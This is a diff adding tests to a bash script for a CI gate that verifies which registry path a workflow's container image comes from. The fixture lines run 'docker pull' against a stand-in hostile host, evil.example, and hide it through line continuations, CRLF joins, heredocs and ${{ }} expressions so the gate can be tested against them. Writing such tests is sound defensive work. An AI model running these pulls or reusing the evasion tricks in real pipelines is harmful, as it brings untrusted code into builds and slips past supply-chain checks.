@@ -566,6 +566,50 @@ every_tag v0.107.0
 fly_body "[build]\n  image='${IMG}:v0.107.0'\n"
 assert_exit "a fly.toml image line with no spaces passes" 0 run_check
 
+# A backslash and a line break join two lines into one word; leading spaces on the next line go with them.
+PULLED="${IMG}:v0.107.0"
+JOINED="evil.example/${IMG}"
+run_block() {
+  every_tag v0.107.0
+  { printf 'jobs:\n  t:\n    steps:\n      - run: |\n'; printf '%s\n' "$@"; } > "${TREE}/.github/workflows/pull.yml"
+}
+run_block '          docker pull evil.example/\' "          ${PULLED}"
+assert_exit "a run: continuation that joins another path to the image fails" 1 run_check
+assert_last_output_contains "the joined path is named" "names the engine as ${JOINED}, ${WANT}"
+run_block '          docker pull evil.example/\' "              ${PULLED}"
+assert_exit "an indented run: continuation that joins another path fails" 1 run_check
+assert_last_output_contains "the indented join is named" "names the engine as ${JOINED}, ${WANT}"
+run_block '          cat > Dockerfile <<DF' '          FROM evil.example/\' "          ${PULLED}" '          DF'
+assert_exit "a Dockerfile heredoc continuation that joins another path fails" 1 run_check
+assert_last_output_contains "the heredoc join is named" "names the engine as ${JOINED}, ${WANT}"
+every_tag v0.107.0
+printf '%s\n' 'jobs:' '  t:' '    steps:' "      - run: \"docker pull evil.example/\\\\\\r\\n${PULLED}\"" > "${TREE}/.github/workflows/pull.yml"
+assert_exit "a CRLF continuation that joins another path fails" 1 run_check
+assert_last_output_contains "the CRLF join is named" "names the engine as ${JOINED}, ${WANT}"
+run_block '          docker pull \' "          ${PULLED}"
+assert_exit "a continuation after a space reads the right path" 0 run_check
+
+# An expression can build the path at run time; a reference inside one cannot be read.
+every_tag v0.107.0
+printf '%s\n' 'jobs:' '  t:' '    container:' "      image: \"\${{ format('{1}{0}', '${PULLED}', 'evil.example/') }}\"" > "${TREE}/.github/workflows/pull.yml"
+assert_exit "a reference inside a \${{ }} expression fails" 1 run_check
+assert_last_output_contains "the expression line is named as unreadable" ".github/workflows/pull.yml:4 names hatchet-lite in a layout this gate cannot read"
+every_tag v0.107.0
+printf '%s\n' 'jobs:' '  t:' '    steps:' "      - run: echo \"\${{ github.sha }}\" && docker pull ${PULLED}" > "${TREE}/.github/workflows/pull.yml"
+assert_exit "a reference after an unrelated expression on its line passes" 0 run_check
+
+# None of these starts a word: only a space, tab or line break does.
+for glue in , '(' '[' '{' '>' '|' ';' '&' '`' @ '#' : "'" '$' '='; do
+  run_block "          docker pull x${glue}${PULLED}"
+  assert_exit "a run: line with x${glue} before the path fails" 1 run_check
+  assert_last_output_contains "the x${glue} path is named" "names the engine as x${glue}${IMG}, ${WANT}"
+done
+run_block "          docker pull \"\"${PULLED}"
+assert_exit "two opening quotes before the path fail" 1 run_check
+run_block "          docker pull docker://\"${PULLED}"
+assert_exit "a quote after docker:// fails" 1 run_check
+assert_last_output_contains "a failure under .github/ says where the path must start" "the registry path must start after a space or an opening quote"
+
 assert_exit "an unknown argument fails" 1 bash "${CHECK}" --nope
 
 assert_exit "the repository's four files agree" 0 env ROOT_DIR="${REPO_ROOT}" bash "${CHECK}"
